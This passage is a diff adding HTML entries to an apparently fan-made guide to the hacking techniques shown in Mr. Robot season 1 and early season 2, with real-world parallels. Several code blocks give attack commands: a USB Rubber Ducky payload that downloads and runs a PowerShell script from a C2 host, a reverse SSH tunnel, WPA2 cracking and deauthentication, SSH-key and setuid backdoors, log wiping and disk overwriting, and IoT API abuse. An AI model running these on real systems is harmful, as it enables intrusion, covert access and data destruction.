+        <p>Elliot uses <strong>DeepSound</strong> to hide stolen data inside audio CD files. Instead of storing evidence on encrypted drives (which could raise suspicion), he embeds data within WAV/FLAC audio files that play normally but contain hidden encrypted payloads.</p>
+        <ul>
+          <li><strong>Tool:</strong> DeepSound by jpinsoft (real software)</li>
+          <li><strong>Supported Formats:</strong> WAV, FLAC, WMA, APE</li>
+          <li><strong>Encryption:</strong> AES-256 encryption of the hidden payload</li>
+          <li><strong>Advantage:</strong> Audio files play normally; hidden data is undetectable without the tool</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S1E03 -->
+<div class="episode-card" id="s1e3">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">03</span>
+    <div class="ep-title-area">
+      <h3>Debug</h3>
+      <div class="ep-filename">eps1.2_d3bug.mkv</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag social">OSINT</span>
+      <span class="tag attack">RAT</span>
+      <span class="tag tool">Android Exploit</span>
+      <span class="tag tool">DeepSound</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>1. Fernando Vera Surveillance &amp; Digital Investigation</h5>
+        <p>Elliot investigates drug dealer Fernando Vera by performing comprehensive <strong>OSINT</strong> (Open Source Intelligence) reconnaissance, email compromise, and social network analysis to map Vera's criminal operation.</p>
+        <ul>
+          <li><strong>Email Analysis:</strong> Compromising email accounts to read communications</li>
+          <li><strong>Social Network Mapping:</strong> Identifying associates, suppliers, and customers</li>
+          <li><strong>Public Records:</strong> Court records, property databases, phone listings</li>
+          <li><strong>EXIF Data:</strong> Extracting geolocation from photos posted online</li>
+        </ul>
+      </div>
+
+      <div class="hack-detail">
+        <h5>2. Rootkit C2 Infrastructure Discovery</h5>
+        <p>Elliot continues reverse-engineering the rootkit discovered on E Corp's servers, uncovering its <strong>command-and-control (C2)</strong> communication infrastructure. This reveals the rootkit is part of a larger, coordinated attack plan.</p>
+        <ul>
+          <li><strong>Static Analysis:</strong> Disassembling the binary without executing it (IDA Pro, Ghidra, radare2)</li>
+          <li><strong>Dynamic Analysis:</strong> Running in a sandbox to observe behavior</li>
+          <li><strong>Network Analysis:</strong> Identifying C2 server addresses, communication protocols</li>
+          <li><strong>Indicators of Compromise (IOCs):</strong> IP addresses, domain names, file hashes</li>
+        </ul>
+      </div>
+
+      <div class="hack-detail">
+        <h5>3. Android Phone Rooting &amp; Spyware</h5>
+        <p>The episode explores mobile device exploitation, including <strong>rooting Android phones</strong> to install surveillance applications that provide complete access to calls, messages, GPS location, camera, and microphone.</p>
+        <ul>
+          <li><strong>Rooting Tools:</strong> SuperSU for privilege escalation on Android</li>
+          <li><strong>Spyware:</strong> FlexiSPY, Highster Mobile, Spyera (commercial surveillance tools)</li>
+          <li><strong>Capabilities:</strong> Call recording, SMS interception, GPS tracking, camera/mic activation</li>
+          <li><strong>Stealth:</strong> Applications hide from app drawer and run as system services</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S1E04 -->
+<div class="episode-card" id="s1e4">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">04</span>
+    <div class="ep-title-area">
+      <h3>Daemons</h3>
+      <div class="ep-filename">eps1.3_da3m0ns.mp4</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag social">Physical Infiltration</span>
+      <span class="tag hardware">Raspberry Pi</span>
+      <span class="tag hardware">Femtocell</span>
+      <span class="tag hardware">USB Rubber Ducky</span>
+      <span class="tag attack">SCADA/ICS</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>1. Steel Mountain Social Engineering Infiltration</h5>
+        <p>Elliot physically infiltrates the Steel Mountain data center by impersonating <strong>"Sam Sepiol"</strong>, a field technician from a fake company called BansheeNet. He creates a complete pretext identity including a fake website, business cards, and employee badge.</p>
+        <ul>
+          <li><strong>Pretext Creation:</strong> Fake company website (BansheeNet), fabricated employee badge</li>
+          <li><strong>Identity Research:</strong> Studying real technician behavior, dress codes, procedures</li>
+          <li><strong>Confidence Exploitation:</strong> Acting as if he belongs, using authority and technical jargon</li>
+          <li><strong>Physical Bypass:</strong> Tailgating through secure doors, bypassing visitor protocols</li>
+        </ul>
+        <div class="real-world">This mirrors real-world physical penetration testing. Coalfire testers were famously arrested in Iowa (2019) during a legitimate physical pen test of a courthouse. Social engineering with pretext identities has a remarkably high success rate in professional red team engagements.</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>2. Raspberry Pi Drop Box Implant</h5>
+        <p>Elliot plants a <strong>Raspberry Pi</strong> device behind a thermostat/HVAC panel at Steel Mountain. The device is configured with a <strong>cellular modem (3G/4G)</strong> for out-of-band communication, bypassing the facility's network monitoring entirely. Once connected, it provides remote access to the Building Management System (BMS) controlling the HVAC.</p>
+        <ul>
+          <li><strong>Hardware:</strong> Raspberry Pi + 3G/4G cellular modem + battery backup</li>
+          <li><strong>Communication:</strong> Reverse SSH tunnel over cellular to fsociety's C2 server</li>
+          <li><strong>Target:</strong> BACnet/Modbus protocols controlling HVAC systems</li>
+          <li><strong>Concealment:</strong> Small form factor hidden behind physical infrastructure</li>
+        </ul>
+        <div class="code-block"><span class="comment"># Raspberry Pi reverse SSH tunnel (auto-reconnecting)</span>
+autossh -M 0 -N -R 2222:localhost:22 user@c2server.onion \
+  -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3"
+
+<span class="comment"># Once connected, access HVAC via BACnet</span>
+python3 bacnet_scan.py --target 192.168.1.0/24
+python3 bacnet_write.py --device HVAC01 --property temperature --value 99</div>
+        <div class="real-world">Commercial versions exist: the Pwn Plug by Pwnie Express is a professional drop box for penetration testing. Raspberry Pi-based implants are commonly used in red team operations, often with LTE modems for out-of-band C2.</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>3. Femtocell Exploitation</h5>
+        <p>The team uses a <strong>modified femtocell</strong> (small cellular base station) to intercept cellular communications near Steel Mountain. The femtocell is reflashed with custom firmware to act as a rogue base station (IMSI catcher).</p>
+        <ul>
+          <li><strong>Hardware:</strong> Commercial femtocell (e.g., Verizon Network Extender) with modified firmware</li>
+          <li><strong>Software:</strong> OpenBTS or OsmocomBB for GSM stack</li>
+          <li><strong>Capabilities:</strong> Intercept calls, SMS, and data from nearby phones</li>
+          <li><strong>Principle:</strong> Phones connect to strongest signal -- rogue tower overpowers legitimate ones</li>
+        </ul>
+        <div class="real-world">Demonstrated at DEF CON 21 (2013) by iSEC Partners (now NCC Group). Doug DePerry and Tom Ritter showed complete voice and data interception through a hacked Verizon femtocell costing ~$250.</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>4. USB Rubber Ducky Parking Lot Drop</h5>
+        <p>Darlene drops <strong>USB Rubber Ducky</strong> devices in the Steel Mountain parking lot, relying on employee curiosity to plug them into workstations. The USB Rubber Ducky appears as a normal flash drive but registers as a <strong>HID (Human Interface Device) keyboard</strong>, executing pre-programmed keystroke payloads at superhuman speed.</p>
+        <ul>
+          <li><strong>Hardware:</strong> Hak5 USB Rubber Ducky (~$50)</li>
+          <li><strong>Microcontroller:</strong> Atmel AT32UC3B1256</li>
+          <li><strong>Payload Language:</strong> DuckyScript</li>
+          <li><strong>Execution Time:</strong> Full payload in 3-15 seconds</li>
+        </ul>
+        <div class="code-block"><span class="comment"># DuckyScript payload example - opens reverse shell</span>
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://c2server/payload.ps1')"
+ENTER
+DELAY 1000
+STRING exit
+ENTER</div>
+        <div class="real-world">Studies show 45-98% of dropped USB drives get plugged in. The US DHS conducted experiments confirming this. USB drop attacks remain one of the most effective physical social engineering vectors.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S1E05 -->
+<div class="episode-card" id="s1e5">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">05</span>
+    <div class="ep-title-area">
+      <h3>Exploits</h3>
+      <div class="ep-filename">eps1.4_3xpl0its.wmv</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">HVAC Hack</span>
+      <span class="tag attack">BACnet</span>
+      <span class="tag tool">RFID Cloning</span>
+      <span class="tag attack">Privilege Escalation</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>1. Steel Mountain HVAC System Compromise</h5>
+        <p>The Raspberry Pi implant activates and fsociety remotely accesses Steel Mountain's <strong>Building Management System (BMS)</strong>. They manipulate the HVAC controllers to raise the temperature, destroying the magnetic LTO backup tapes stored in the facility.</p>
+        <ul>
+          <li><strong>Protocol:</strong> BACnet (Building Automation and Control Network) -- often runs without authentication</li>
+          <li><strong>Target:</strong> Tridium Niagara Framework controllers (real-world vulnerable BMS platform)</li>
+          <li><strong>Attack:</strong> Overriding temperature setpoints to exceed tape storage safe limits</li>
+          <li><strong>Impact:</strong> Magnetic tape degradation begins at ~100&deg;F (38&deg;C); data loss at ~125&deg;F (52&deg;C)</li>
+        </ul>
+        <div class="real-world">Billy Rios and Terry McCorkle demonstrated critical vulnerabilities in Tridium Niagara controllers at Kaspersky's Security Analyst Summit. Over 21,000 Niagara systems were found exposed to the internet. The 2013 Target breach also began with compromised HVAC vendor credentials.</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>2. Linux Privilege Escalation</h5>
+        <p>Elliot needs to escalate privileges on compromised systems to execute the attack chain. Several techniques are referenced:</p>
+        <ul>
+          <li><strong>Kernel Exploits:</strong> Dirty COW (CVE-2016-5195), similar local privilege escalation vulns</li>
+          <li><strong>SUID Binaries:</strong> Finding misconfigured SUID root binaries</li>
+          <li><strong>Cron Jobs:</strong> Writable cron scripts running as root</li>
+          <li><strong>Weak Permissions:</strong> World-writable /etc/passwd or shadow files</li>
+        </ul>
+        <div class="code-block"><span class="comment"># Enumeration for privilege escalation</span>
+find / -perm -4000 -type f 2>/dev/null   <span class="comment"># Find SUID binaries</span>
+cat /etc/crontab                          <span class="comment"># Check cron jobs</span>
+ls -la /etc/passwd /etc/shadow            <span class="comment"># Check permissions</span>
+uname -a                                  <span class="comment"># Kernel version for exploit matching</span>
+python linux-exploit-suggester.py</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>3. RFID Badge Cloning</h5>
+        <p>Physical access to secure areas involves cloning <strong>RFID access badges</strong> using specialized hardware:</p>
+        <ul>
+          <li><strong>Tastic RFID Thief:</strong> Long-range RFID reader that can capture badge data from several feet away</li>
+          <li><strong>GeZhi HID Cloner:</strong> Portable device for cloning HID proximity cards</li>
+          <li><strong>Attack Range:</strong> Can read badges from 3+ feet, even through clothing or bags</li>
+          <li><strong>Target:</strong> HID 125kHz proximity cards (extremely common in corporate environments)</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S1E06 -->
+<div class="episode-card" id="s1e6">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">06</span>
+    <div class="ep-title-area">
+      <h3>Brave Traveler</h3>
+      <div class="ep-filename">eps1.5_br4ve-trave1er.asf</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Prison Network Hack</span>
+      <span class="tag tool">Proxychains</span>
+      <span class="tag tool">Tor</span>
+      <span class="tag social">Vishing</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>1. Prison Network Exploitation</h5>
+        <p>Elliot hacks into the prison system to arrange Fernando Vera's release. He compromises the correctional facility's network, which runs outdated systems with known vulnerabilities, to manipulate records and security systems.</p>
+        <ul>
+          <li><strong>Target:</strong> Correctional facility inmate management system</li>
+          <li><strong>Likely Vector:</strong> SQL injection on web-facing applications, or exploitation of unpatched systems</li>
+          <li><strong>Goal:</strong> Manipulate records, access control systems, or release procedures</li>
+        </ul>
+      </div>
+
+      <div class="hack-detail">
+        <h5>2. Multi-Layer Network Obfuscation</h5>
+        <p>Elliot chains multiple anonymization layers to hide the attack's origin:</p>
+        <ul>
+          <li><strong>VPN Chain:</strong> Multiple VPN servers in different jurisdictions</li>
+          <li><strong>Tor:</strong> Onion routing through 3+ relays</li>
+          <li><strong>SSH Tunnels:</strong> Encrypted tunnels through compromised servers</li>
+          <li><strong>Proxychains:</strong> Routing tools through SOCKS4/5 proxy chains</li>
+        </ul>
+        <div class="code-block"><span class="comment"># Proxychains configuration for multi-hop anonymization</span>
+<span class="comment"># /etc/proxychains.conf</span>
+dynamic_chain
+proxy_dns
+socks5 127.0.0.1 9050    <span class="comment"># Tor SOCKS proxy</span>
+socks5 proxy1.example 1080
+socks5 proxy2.example 1080
+
+<span class="comment"># Route nmap through proxy chain</span>
+proxychains nmap -sT -Pn target_ip</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>3. Printer Exploitation &amp; Tracking Dots</h5>
+        <p>The episode references <strong>printer security vulnerabilities</strong> and the existence of <strong>Machine Identification Codes (MICs)</strong> -- tiny yellow dots printed by color laser printers that encode the printer's serial number, date, and time.</p>
+        <ul>
+          <li><strong>PRET:</strong> Printer Exploitation Toolkit for attacking network printers</li>
+          <li><strong>Tracking Dots:</strong> Nearly invisible yellow dots that identify the source printer</li>
+          <li><strong>Vulnerabilities:</strong> PJL/PS language injection, LDAP credential theft, print job interception</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S1E07 -->
+<div class="episode-card" id="s1e7">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">07</span>
+    <div class="ep-title-area">
+      <h3>View Source</h3>
+      <div class="ep-filename">eps1.6_v1ew-s0urce.flv</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">SSH Backdoor</span>
+      <span class="tag tool">Android RAT</span>
+      <span class="tag attack">Wi-Fi Cracking</span>
+      <span class="tag tool">aircrack-ng</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>1. Tyrell Wellick's SSH Backdoor</h5>
+        <p>Tyrell installs a <strong>persistent SSH backdoor</strong> on E Corp's servers, leveraging his executive position (Senior VP of Technology) for insider access. He modifies SSH configuration to accept his key, creating a hidden administrative channel.</p>
+        <div class="code-block"><span class="comment"># Adding unauthorized SSH key for persistent access</span>
+echo "ssh-rsa AAAA...tyrell@ecorp" >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+
+<span class="comment"># Alternatively, modifying PAM for backdoor authentication</span>
+<span class="comment"># Or planting a setuid root shell</span>
+cp /bin/bash /tmp/.hidden_shell
+chmod u+s /tmp/.hidden_shell</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>2. Android Phone Exploitation via Physical Access</h5>
+        <p>Tyrell gains brief physical access to an executive's phone and installs a <strong>Remote Access Trojan (RAT)</strong>. With an unlocked Android device, installing a monitoring APK takes seconds.</p>
+        <ul>
+          <li><strong>Method:</strong> ADB (Android Debug Bridge) sideloading or direct APK installation</li>
+          <li><strong>RAT:</strong> AndroRAT or similar Android remote access tool</li>
+          <li><strong>Capabilities:</strong> Full device control -- camera, microphone, GPS, SMS, calls, files</li>
+          <li><strong>Stealth:</strong> App hides from launcher, runs as background service</li>
+        </ul>
+      </div>
+
+      <div class="hack-detail">
+        <h5>3. WPA2 Wi-Fi Cracking</h5>
+        <p>Wi-Fi network attacks using the <strong>aircrack-ng</strong> suite to capture and crack WPA2 handshakes:</p>
+        <div class="code-block"><span class="comment"># Put wireless adapter in monitor mode</span>
+airmon-ng start wlan0
+
+<span class="comment"># Scan for networks</span>
+airodump-ng wlan0mon
+
+<span class="comment"># Capture WPA2 handshake (target specific network)</span>
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+<span class="comment"># Deauthenticate client to force reconnection/handshake</span>
+aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+
+<span class="comment"># Crack captured handshake</span>
+aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+
+<span class="comment"># Alternative: automated with wifite</span>
+wifite --wpa --dict /usr/share/wordlists/rockyou.txt</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>4. Elliot's Self-Forensics</h5>
+        <p>Elliot discovers he may be compromised and performs forensic analysis on his own systems, checking for signs of intrusion:</p>
+        <div class="code-block"><span class="comment"># Check for suspicious network connections</span>
+netstat -tulpn | grep ESTABLISHED
+ss -tulpn
+lsof -i -P -n
+
+<span class="comment"># Check for suspicious processes</span>
+ps aux --sort=-%mem | head -20
+top -bn1
+
+<span class="comment"># Check for unauthorized cron jobs</span>
+crontab -l
+ls -la /etc/cron.*
+
+<span class="comment"># Check SSH authorized keys</span>
+cat ~/.ssh/authorized_keys
+cat /root/.ssh/authorized_keys
+
+<span class="comment"># Check for modified system binaries</span>
+debsums -c 2>/dev/null    <span class="comment"># Debian/Ubuntu</span>
+rpm -Va 2>/dev/null        <span class="comment"># RHEL/CentOS</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S1E08 -->
+<div class="episode-card" id="s1e8">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">08</span>
+    <div class="ep-title-area">
+      <h3>Whiterose</h3>
+      <div class="ep-filename">eps1.7_wh1ter0se.m4v</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag tool">IRC + OTR</span>
+      <span class="tag tool">Tor Hidden Services</span>
+      <span class="tag social">Psychological Manipulation</span>
+      <span class="tag attack">Coordinated Attack</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>1. Dark Army Coordination via Encrypted IRC</h5>
+        <p>fsociety coordinates with the Chinese hacking group <strong>Dark Army</strong> using IRC (Internet Relay Chat) hosted on Tor hidden services with <strong>OTR (Off-the-Record)</strong> encryption for end-to-end message security.</p>
+        <ul>
+          <li><strong>IRC Server:</strong> Hosted as Tor hidden service (.onion address)</li>
+          <li><strong>Encryption:</strong> OTR provides forward secrecy and deniability</li>
+          <li><strong>OPSEC:</strong> No logging, auto-expiring messages, identity verification via fingerprints</li>
+        </ul>
+      </div>
+
+      <div class="hack-detail">
+        <h5>2. Time-Synchronized Multi-Location Attack</h5>
+        <p>The attack requires <strong>precise timing coordination</strong> between fsociety (New York) and Dark Army (China) to simultaneously compromise E Corp's distributed infrastructure across multiple data centers.</p>
+        <ul>
+          <li><strong>Challenge:</strong> Attacking replicated systems requires simultaneous execution</li>
+          <li><strong>Technique:</strong> NTP-synchronized attack triggers with pre-agreed time windows</li>
+          <li><strong>OPSEC:</strong> Limited communication windows to minimize exposure</li>
+        </ul>
+        <div class="real-world">Coordinated multi-location attacks are characteristic of APT operations. The 2013 South Korea banking attack simultaneously wiped systems across multiple financial institutions at a pre-set time, demonstrating this methodology in practice.</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>3. Whiterose's Social Engineering Mastery</h5>
+        <p>Whiterose demonstrates <strong>advanced psychological manipulation</strong> -- studying targets' emotional vulnerabilities, personal histories, and psychological profiles to gain compliance. This represents the highest level of social engineering: manipulating beliefs and motivations rather than simply extracting information.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S1E09 -->
+<div class="episode-card" id="s1e9">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">09</span>
+    <div class="ep-title-area">
+      <h3>Mirroring</h3>
+      <div class="ep-filename">eps1.8_m1rr0r1ng.qt</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">AES-256 Encryption</span>
+      <span class="tag attack">Cryptoworm</span>
+      <span class="tag tool">Metasploit</span>
+      <span class="tag tool">Python</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>1. E Corp Financial System Architecture Mapping</h5>
+        <p>fsociety maps E Corp's complete data architecture to ensure the attack destroys <strong>all copies</strong> of financial records -- primary data centers, backup tapes (Steel Mountain), offsite replication (China), and disaster recovery sites.</p>
+        <ul>
+          <li><strong>Primary Systems:</strong> Live databases and application servers</li>
+          <li><strong>Backup Tapes:</strong> LTO tapes at Steel Mountain (already compromised via HVAC)</li>
+          <li><strong>Offsite Replication:</strong> Chinese data center (Dark Army handles this)</li>
+          <li><strong>DR Sites:</strong> Disaster recovery infrastructure</li>
+        </ul>
+      </div>
+
+      <div class="hack-detail">
+        <h5>2. Custom Cryptoworm Development</h5>
+        <p>Darlene develops the <strong>custom malware (cryptoworm)</strong> that will encrypt E Corp's financial data using AES-256 encryption. The worm must propagate across the network, identify target databases, encrypt records, and securely delete the originals.</p>
+        <ul>
+          <li><strong>Encryption:</strong> AES-256 (symmetric key encryption -- computationally infeasible to brute force)</li>
+          <li><strong>Propagation:</strong> Self-replicating worm spreading via network shares, SSH, and exploits</li>
+          <li><strong>Key Management:</strong> Encryption keys are designed to be destroyed after the attack</li>
+          <li><strong>Languages:</strong> Python for rapid development, C/C++ for performance-critical components</li>
+        </ul>
+        <div class="code-block"><span class="comment"># Simplified encryption logic (Python pseudocode)</span>
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+import os
+
+key = get_random_bytes(32)  <span class="comment"># AES-256 key</span>
+iv = get_random_bytes(16)   <span class="comment"># Initialization vector</span>
+
+cipher = AES.new(key, AES.MODE_CBC, iv)
+<span class="comment"># Encrypt target financial database files</span>
+<span class="comment"># Securely overwrite originals with random data</span>
+<span class="comment"># Destroy encryption key after completion</span></div>
+        <div class="real-world">This attack predated WannaCry (2017) and NotPetya (2017) by two years, making the show remarkably prescient. NotPetya caused ~$10 billion in damage using similar techniques -- it masqueraded as ransomware but was actually a destructive wiper with no real decryption mechanism.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S1E10 -->
+<div class="episode-card" id="s1e10">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">10</span>
+    <div class="ep-title-area">
+      <h3>Zero Day</h3>
+      <div class="ep-filename">eps1.9_zer0-day.avi</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">The 5/9 Hack</span>
+      <span class="tag attack">Data Destruction</span>
+      <span class="tag attack">Anti-Forensics</span>
+      <span class="tag tool">AES-256</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>1. The 5/9 Hack -- E Corp Data Destruction</h5>
+        <p>fsociety executes the <strong>final coordinated attack</strong>, encrypting and destroying all of E Corp's financial records across every redundant copy. This is essentially a sophisticated, multi-vector, targeted ransomware attack without the ransom -- pure destruction.</p>
+        <ul>
+          <li><strong>Attack Chain:</strong>
+            <ul>
+              <li>Step 1: Compromised insider access (Tyrell's backdoor)</li>
+              <li>Step 2: Physical destruction of backup tapes (HVAC attack at Steel Mountain)</li>
+              <li>Step 3: Dark Army compromises Chinese data center simultaneously</li>
+              <li>Step 4: Cryptoworm encrypts all live financial data with AES-256</li>
+              <li>Step 5: Encryption keys are securely destroyed</li>
+            </ul>
+          </li>
+          <li><strong>Result:</strong> 70% of global consumer debt records destroyed</li>
+        </ul>
+        <div class="real-world">Parallels: Sony Pictures Hack (2014) -- destructive attack wiping corporate data. Saudi Aramco/Shamoon (2012) -- wiped 35,000 workstations. NotPetya (2017) -- disguised as ransomware, caused ~$10B damage. The show aired in 2015 and was remarkably prescient about the ransomware epidemic that followed.</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>2. Anti-Forensics &amp; Evidence Destruction</h5>
+        <p>fsociety implements comprehensive <strong>anti-forensics</strong> measures to prevent attribution:</p>
+        <div class="code-block"><span class="comment"># Secure file deletion (multi-pass overwrite)</span>
+shred -vfz -n 5 /path/to/evidence
+
+<span class="comment"># Clear bash history</span>
+history -c
+rm -f ~/.bash_history
+ln -sf /dev/null ~/.bash_history
+
+<span class="comment"># Clear system logs</span>
+echo "" > /var/log/auth.log
+echo "" > /var/log/syslog
+echo "" > /var/log/kern.log
+
+<span class="comment"># Timestomping (modify file timestamps)</span>
+touch -t 202001010000 /path/to/file
+
+<span class="comment"># Secure memory wipe</span>
+dd if=/dev/urandom of=/dev/sda bs=1M count=1024</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>3. Tyrell's Persistent Root Backdoor</h5>
+        <p>Tyrell has maintained a <strong>root-level persistent backdoor</strong> on E Corp's systems through multiple methods:</p>
+        <ul>
+          <li><strong>Trojaned SSH:</strong> Modified SSH binary that accepts a hardcoded password</li>
+          <li><strong>Kernel Module Rootkit:</strong> Loadable kernel module (LKM) hiding processes and files</li>
+          <li><strong>Modified Init Scripts:</strong> Backdoor launched at every system boot</li>
+          <li><strong>PAM Backdoor:</strong> Modified Pluggable Authentication Module accepting master password</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+<!-- END SEASON 1 -->
+
+<!-- PLACEHOLDER FOR SEASONS 2-4 (will be populated) -->
+<div class="season-section" id="s2">
+<div class="season-header">
+  <h2>// SEASON 2</h2>
+  <p>The aftermath of the 5/9 hack. As the world reels from the financial collapse, fsociety plans their next move against the FBI investigation. Features the iconic femtocell hack and USB Rubber Ducky attack on the FBI.</p>
+</div>
+
+<!-- S2E01 -->
+<div class="episode-card" id="s2e1">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">01</span>
+    <div class="ep-title-area">
+      <h3>Unmask</h3>
+      <div class="ep-filename">eps2.0_unm4sk-pt1.tc &amp; eps2.0_unm4sk-pt2.tc</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">IoT Hacking</span>
+      <span class="tag attack">Smart Home Takeover</span>
+      <span class="tag hardware">Femtocell</span>
+      <span class="tag social">Physical Eviction</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>1. Smart Home / IoT Takeover (Susan Jacobs' House)</h5>
+        <p>Darlene and fsociety compromise the <strong>entire smart home automation system</strong> of E Corp general counsel Susan Jacobs. They manipulate IoT devices to make the house uninhabitable, forcing Susan out so fsociety can use it as their base of operations.</p>
+        <ul>
+          <li><strong>Thermostat Control:</strong> Setting extreme temperatures to make the house uncomfortable</li>
+          <li><strong>Audio System:</strong> Playing loud music at maximum volume at all hours</li>
+          <li><strong>Alarm System:</strong> Repeatedly triggering the security alarm</li>
+          <li><strong>Smart Shower:</strong> Manipulating water temperature controls</li>
+          <li><strong>Attack Vector:</strong> Compromised centralized home automation hub (Crestron/Control4-like system)</li>
+          <li><strong>Entry Point:</strong> Default credentials on IoT devices, UPnP/SSDP protocol exploitation</li>
+        </ul>
+        <div class="code-block"><span class="comment"># IoT device enumeration on home network</span>
+nmap -sV -p 1-65535 192.168.1.0/24
+<span class="comment"># Many IoT hubs expose REST APIs without authentication</span>
+curl http://192.168.1.100:8080/api/thermostat/setpoint -X POST -d '{"temp":99}'
+curl http://192.168.1.100:8080/api/alarm/trigger -X POST</div>
+        <div class="real-world">IoT devices are notoriously insecure. Rapid7 research demonstrated mass compromise of smart thermostats, Hue lights, and home automation controllers. The Mirai botnet (2016) exploited default credentials on hundreds of thousands of IoT devices.</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>2. Femtocell Planning</h5>
+        <p>Darlene begins planning the construction of a <strong>modified femtocell</strong> to intercept FBI cellular communications. This sets up the season's primary technical operation.</p>
+        <ul>
+          <li><strong>Concept:</strong> Small cellular base station modified to act as a rogue cell tower</li>
+          <li><strong>Target:</strong> FBI agents' cellular phones at the E Corp field office</li>
+          <li><strong>Goal:</strong> Intercept calls, SMS, and data to monitor the FBI investigation</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S2E02 -->
+<div class="episode-card" id="s2e2">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">02</span>
+    <div class="ep-title-area">
+      <h3>Kernel Panic</h3>
+      <div class="ep-filename">eps2.1_k3rnel-pan1c.ksd</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Kernel Panic</span>
+      <span class="tag tool">Tor Hidden Service</span>
+      <span class="tag tool">Bitcoin</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>1. Ray's Dark Web Marketplace</h5>
+        <p>Elliot discovers that Ray operates a <strong>dark web marketplace</strong> similar to Silk Road, running as a Tor hidden service. The marketplace facilitates illegal trade using cryptocurrency for payments and PGP for encrypted communications.</p>
+        <ul>
+          <li><strong>Platform:</strong> Tor hidden service (.onion address)</li>
+          <li><strong>Payments:</strong> Bitcoin with tumbling/mixing for anonymity</li>
+          <li><strong>Communications:</strong> PGP/GPG encryption for buyer-seller messages</li>
+          <li><strong>Goods:</strong> Drugs, weapons, stolen data, human trafficking</li>
+        </ul>
+        <div class="code-block"><span class="comment"># Tor hidden service configuration (/etc/tor/torrc)</span>
